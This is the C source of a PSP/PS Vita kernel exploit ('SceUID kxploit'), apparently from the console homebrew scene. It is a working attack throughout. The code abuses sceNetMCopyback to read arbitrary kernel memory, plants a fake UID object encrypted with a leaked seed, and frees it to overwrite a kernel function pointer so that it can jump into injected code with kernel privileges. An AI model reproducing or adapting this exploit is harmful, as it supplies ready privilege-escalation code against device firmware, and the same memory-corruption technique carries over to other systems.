/*
SceUID kernel exploit and read-only exploit by qwikrazor87.
Inspired by part of the Trinity exploit chain by thefl0w.
Put together by Acid_Snake, meetpatty, CelesteBlue and krazynez.

Made to work on OFW and CFW.

*/

#include <pspdebug.h>
#include <pspctrl.h>
#include <pspsdk.h>
#include <pspiofilemgr.h>
#include <psputility.h>
#include <psputility_htmlviewer.h>
#include <psploadexec.h>
#include <psputils.h>
#include <psputilsforkernel.h>
#include <pspsysmem.h>
#include <psppower.h>
#include <string.h>

#include "macros.h"
#include "globals.h"
#include "functions.h"
#include "kxploit.h"

#define LIBC_CLOCK_OFFSET_660  0x88014400
#define LIBC_CLOCK_OFFSET_360  0x88014D80
#define LIBC_CLOCK_OFFSET_365  0x88014D00
#define SYSMEM_SEED_OFFSET_365 0x88014E38
#define SYSMEM_SEED_OFFSET_CHECK SYSMEM_TEXT+0x00002FA8

#define FAKE_UID_OFFSET        0x80

UserFunctions* g_tbl = NULL;
static int libc_clock_offset = LIBC_CLOCK_OFFSET_360;
static u32 jump_ptr = 0;
void (*_sceNetMCopyback_1560F143)(uint32_t * a0, uint32_t a1, uint32_t a2, uint32_t a3);

u32 patch_instr = 0;
u32 patch_addr = 0;

/* Actual code to trigger the kram read vulnerability.
    We can read the value stored at any location in Kram.
*/

int sceNetMCopyback_exploit_helper(uint32_t addr, uint32_t value, uint32_t seed) {
	uint32_t a0[7];
	a0[0] = addr - 12;
	a0[3] = seed + 1; // (int)a0[3] must be < (int)a1
	a0[4] = 0x20000; // a0[4] must be = 0x20000
	a0[6] = seed; // (int)a0[6] must be < (int)a0[3]
	uint32_t a1 = value + seed + 1;
	uint32_t a2 = 0; // a2 must be <= 0
	uint32_t a3 = 1; // a3 must be > 0
	_sceNetMCopyback_1560F143(a0, a1, a2, a3);
	return a0[6] != seed;
}

// input: 4-byte-aligned kernel address to a non-null positive 32-bit integer
// return *addr >= value;
int is_ge_pos(uint32_t addr, uint32_t value) {
	return sceNetMCopyback_exploit_helper(addr, value, 0xFFFFFFFF);
}

// input: 4-byte-aligned kernel address to a non-null negative 32-bit integer
// return *addr <= value;
int is_le_neg(uint32_t addr, uint32_t value) {
	return sceNetMCopyback_exploit_helper(addr, value, 0x80000000);
}

// input: 4-byte-aligned kernel address to a non-null 32-bit integer
// return (int)*addr > 0
int is_positive(uint32_t addr) {
	return is_ge_pos(addr, 1);
}
u32 readKram(u32 addr) {
	unsigned int res = 0;
	int bit_idx = 1;
	if (is_positive(addr)) {
		for (; bit_idx < 32; bit_idx++) {
			unsigned int value = res | (1 << (31 - bit_idx));
			if (is_ge_pos(addr, value))
				res = value;
		}
		return res;
	}
	res = 0x80000000;
	for (; bit_idx < 32; bit_idx++) {
		unsigned int value = res | (1 << (31 - bit_idx));
		if (is_le_neg(addr, value))
			res = value;
	}
	if (res == 0xFFFFFFFF)
		res = 0;
	return res;
}

// restore corrupted kernel memory
void repairInstruction(KernelFunctions* k_tbl) {
  if (patch_addr && patch_instr){
      _sw(patch_instr, patch_addr);
  }
}

// find needed functions
int stubScanner(UserFunctions* tbl){
    int res = 0;
    g_tbl = tbl;

    // load some common modules
    g_tbl->UtilityLoadModule(PSP_MODULE_NP_COMMON);
    g_tbl->UtilityLoadModule(PSP_MODULE_NET_COMMON);
    g_tbl->UtilityLoadModule(PSP_MODULE_NET_INET);
	  _sceNetMCopyback_1560F143 = tbl->FindImportUserRam("sceNetIfhandle_lib", 0x1560F143);

    return (_sceNetMCopyback_1560F143==NULL);
}

/*
FakeUID kxploit
*/
int doExploit(void) {

    int res;
    u32 seed = 0;
    patch_addr = 0;
    patch_instr = 0;

    // use read-only exploit to figure out things
    if (_sceNetMCopyback_1560F143 != NULL){
      // not the most robust, but it works
      u32 test_val = readKram(SYSMEM_SEED_OFFSET_CHECK);
      if (test_val == 0x8F154E38){
        // 3.65+ requires the fake UID object to UID encrypted with random seed
        seed = readKram(SYSMEM_SEED_OFFSET_365); // we need to read this seed so we can plant fake UID object
        libc_clock_offset = LIBC_CLOCK_OFFSET_365; // adjust offset
        PRTSTR("Vita 3.65+");
      }
      else if (test_val == 0x8FBF003C){
        libc_clock_offset = LIBC_CLOCK_OFFSET_660; // adjust offset
        PRTSTR("PSP 6.60+");
      }
      else {
        PRTSTR("Vita 3.60");
        libc_clock_offset = LIBC_CLOCK_OFFSET_360; // adjust offset
      }
    }

    // Allocate dummy blocks to improve reliability
    char dummy[32];
    memset(dummy, 'a', sizeof(dummy));
    SceUID dummyid;
    for (int i=0; i<10; i++) // a few iterations seem to improve stability
      dummyid = g_tbl->KernelAllocPartitionMemory(PSP_MEMORY_PARTITION_USER, dummy, PSP_SMEM_High, 0x10, NULL);

    // we can use whatever memory allocated by dummy block to inject some code, thus not needing to rely on hardcoded pointers
    jump_ptr = g_tbl->KernelGetBlockHeadAddr(dummyid) + 4;

    // we can calculate the address of dummy block via its UID and from there calculate where the next block will be
    u32 dummyaddr = 0x88000000 + ((dummyid >> 5) & ~3);
    u32 newaddr = dummyaddr - FAKE_UID_OFFSET;
    SceUID uid = (((newaddr & 0x00ffffff) >> 2) << 7) | 0x1;
    SceUID encrypted_uid = uid ^ seed; // encrypt UID with seed, if there's none then A^0=A

    // grab some data from dummy UID block to implant into our fake UID block, this removes some hardcoding and improves reliability
    u32 type_uid = readKram(dummyaddr+8);
    u32 uid_name = readKram(dummyaddr+16);
    u32 t1 = readKram(dummyaddr+24);
    u32 t2 = readKram(dummyaddr+28);

    // Plant UID data structure into kernel as string
    u32 string[] = { libc_clock_offset - 4, KERNELIFY(jump_ptr), type_uid, encrypted_uid, uid_name, 0x1010070A, t1, t2, 0};
    SceUID plantid = g_tbl->KernelAllocPartitionMemory(PSP_MEMORY_PARTITION_USER, (char *)string, PSP_SMEM_High, 0x10, NULL);

    g_tbl->KernelDcacheWritebackAll();

    // check that the fake UID block has been planted where we expect
    u32 test = readKram(newaddr+8);
    if (test != type_uid) return 0xDEADBEEF;

    // backup data so we can restore later
    patch_addr = libc_clock_offset;
    patch_instr = readKram(libc_clock_offset);

    // Overwrite function pointer at LIBC_CLOCK_OFFSET with 0x88888888
    res = g_tbl->KernelFreePartitionMemory(uid);

    g_tbl->KernelDcacheWritebackAll();

    if (res < 0) return res;

    return 0;
}

void executeKernel(u32 kernelContentFunction){
  // Make a jump to kernel function
  _sw(JUMP(KERNELIFY(kernelContentFunction)), jump_ptr);
  _sw(NOP, jump_ptr+4);
  g_tbl->KernelDcacheWritebackAll();

  // Execute kernel function
  g_tbl->KernelLibcClock();
}
